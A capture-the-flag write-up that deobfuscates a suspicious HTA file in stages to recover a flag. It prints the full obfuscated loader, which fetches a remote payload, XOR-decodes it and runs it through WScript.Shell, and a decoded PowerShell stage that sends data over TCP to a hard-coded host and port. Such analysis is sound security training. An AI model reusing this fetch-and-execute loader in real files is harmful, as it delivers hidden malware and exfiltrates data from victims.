# Description

I found this strange file on my computer, but i don't know this type of file.

# Solving

The challenge provide us a `obfusced` `.hta` file :

```hta
<!DOCTYPE html><html><head><title>Challenge MIDNIGHHHTT</title><HTA:APPLICATION ID="Challenge MIDNIGHHHTT" APPLICATIONNAME="Challenge MIDNIGHHHTT" BORDER="thin" BORDERSTYLE="normal" CAPTION="yes" ICON="" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="yes" SINGLEINSTANCE="yes" SYSMENU="yes" WINDOWSTATE="normal"><script type="text/javascript">function _0x47c6(){var _0x24b5fe=['charCodeAt','2018493vyzWaQ','GET','1199740ZZkZMB','1113zrFMpW','983352JhRqSq','11GLgYUF','2042286SJcWYB','W1N','length','16kWycOk','status','LmxhbWFyci5iemgv','fromCharCode','25086eTSMGS','V1NjcmlwdC5TaGVsbAo=','2561550lxjKXE','563001FUFdqY','open','aHR0cHM6Ly9tY3Rm','send','4AXEFkT'];_0x47c6=function(){return _0x24b5fe;};return _0x47c6();}function _0x44d2(_0x42f8c7,_0x8488ed){var _0x47c61e=_0x47c6();return _0x44d2=function(_0x44d20f,_0x146a27){_0x44d20f=_0x44d20f-0x16a;var _0x3e9d64=_0x47c61e[_0x44d20f];return _0x3e9d64;},_0x44d2(_0x42f8c7,_0x8488ed);}(function(_0x363748,_0x2cce7f){var _0x3c7483=_0x44d2,_0x132437=_0x363748();while(!![]){try{var _0x29fe2c=-parseInt(_0x3c7483(0x17f))/0x1+parseInt(_0x3c7483(0x173))/0x2+-parseInt(_0x3c7483(0x175))/0x3+parseInt(_0x3c7483(0x16d))/0x4*(parseInt(_0x3c7483(0x171))/0x5)+-parseInt(_0x3c7483(0x17c))/0x6*(-parseInt(_0x3c7483(0x172))/0x7)+-parseInt(_0x3c7483(0x178))/0x8*(-parseInt(_0x3c7483(0x16f))/0x9)+-parseInt(_0x3c7483(0x17e))/0xa*(parseInt(_0x3c7483(0x174))/0xb);if(_0x29fe2c===_0x2cce7f)break;else _0x132437['push'](_0x132437['shift']());}catch(_0x28a4fc){_0x132437['push'](_0x132437['shift']());}}}(_0x47c6,0x543cf),(function(){var _0x584c3e=_0x44d2;function _0x34f9b4(_0x3215f4){return atob(_0x3215f4);}function _0xc1e5d1(_0x3f15e1){var _0x4ed775='';for(var _0xf35ea5=0x0;_0xf35ea5<_0x3f15e1['length'];_0xf35ea5++){_0x4ed775+=_0x3f15e1[_0xf35ea5];}return _0x4ed775;}function _0x377f01(_0x297534,_0x16c885){var _0x40528a=_0x44d2,_0x5abc45='';for(var _0x581cac=0x0;_0x581cac<_0x297534[_0x40528a(0x177)];_0x581cac++){_0x5abc45+=String[_0x40528a(0x17b)](_0x297534[_0x40528a(0x16e)](_0x581cac)^_0x16c885);}return _0x5abc45;}var _0x5295f9='TVNYTDIuWE1MSFhM',_0x42f735=_0x34f9b4(_0x5295f9),_0x871fec=new ActiveXObject(_0x42f735),_0xc3fb0e=[_0x584c3e(0x16b),_0x584c3e(0x17a),'Q0ZjR0ZDR2du'],_0x25f746=_0xc1e5d1(_0xc3fb0e),_0x16b3fc=_0x34f9b4(_0x25f746);_0x871fec[_0x584c3e(0x16a)](_0x584c3e(0x170),_0x16b3fc,![]),_0x871fec[_0x584c3e(0x16c)]();if(_0x871fec[_0x584c3e(0x179)]==0xc8){var _0x462594=_0x871fec['responseText'],_0x32ebbf=_0x377f01(_0x462594,0x42),_0x439677=[_0x584c3e(0x176),_0x584c3e(0x17d)],_0x66a026=_0x34f9b4(_0x439677[0x1]);new ActiveXObject(_0x66a026)['Run'](_0x32ebbf,0x0,!![]);}else throw new Error(_0x871fec[_0x584c3e(0x179)]);}()));</script></head><body></body></html>
```
Decoding the `base64` in it, we can retreive :

```
b64_strings = [
    "TVNYTDIuWE1MSFhM",        # => MSXML2.XMLHTTP
    "V1NjcmlwdC5TaGVsbAo=",    # => WScript.Shell
    "aHR0cHM6Ly9tY3Rm",        # => https://mctf
    "LmxhbWFyci5iemgv",        # => .lamarr.bzh/
    "Q0ZjR0ZDR2du"             # => CFcFDCGgn
]
```
So it retreive an url : `https://mctf.lamarr.bzh/CFcFDCGgn`. I do so and get the file, I have done same as in the script and `XOR` it with a `0x42` key which gave me :

```Powershell
$base64Encoded = "JHpGPVtUZXh0LkVuY29kaW5nXTo6VVRGODskcVc9W0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJBRG9IZFJnOVVSSVlLakFIRjBNREdoSklabXdnSUZJVkxCZ3lVZ0lUVWhVM0F3cHFIZz09Iik7JGpSPSR6Ri5HZXRTdHJpbmcoJHFXKTskdEc9Ik15UzNjcjN0IjskckY9IiI7MC4uKCRqUi5MZW5ndGgtMSl8JXsgJHJGKz1bY2hhcl0oKFtpbnRdW2NoYXJdJGpSWyRfXSkgLWJ4b3IgKFtpbnRdW2NoYXJdJHRHWyRfJSR0Ry5MZW5ndGhdKSl9OyR5VD1OZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRjcENsaWVudCgiMTkyLjE2OC4xLjEwMCIsNDQ0NCk7JHBPPSR5VC5HZXRTdHJlYW0oKTskaUo9TmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJHBPKTskaUouV3JpdGUoJHJGKTskaUouRmx1c2goKTskeVQuQ2xvc2UoKTs="
$decodedBytes = [System.Convert]::FromBase64String($base64Encoded)
$decodedString = [System.Text.Encoding]::Unicode.GetString($decodedBytes)
Invoke-Expression $decodedString
```
Here it's pretty easy, we just have to decode the `base64`, this gave us :

```Powershell
$zF=[Text.Encoding]::UTF8;$qW=[Convert]::FromBase64String("ADoHdRg9URIYKjAHF0MDGhJIZmwgIFIVLBgyUgITUhU3AwpqHg==");$jR=$zF.GetString($qW);$tG="MyS3cr3t";$rF="";0..($jR.Length-1)|%{ $rF+=[char](([int][char]$jR[$_]) -bxor ([int][char]$tG[$_%$tG.Length]))};$yT=New-Object Net.Sockets.TcpClient("192.168.1.100",4444);$pO=$yT.GetStream();$iJ=New-Object IO.StreamWriter($pO);$iJ.Write($rF);$iJ.Flush();$yT.Close();
```
And once again, we just follow the script and decode from `b64` and `XOR` with `MyS3cr3t` key.

Wich gave us the flag : `MCTF{ObfUSc4t10n_15_CRaaaaaaaaaazzYY}` 
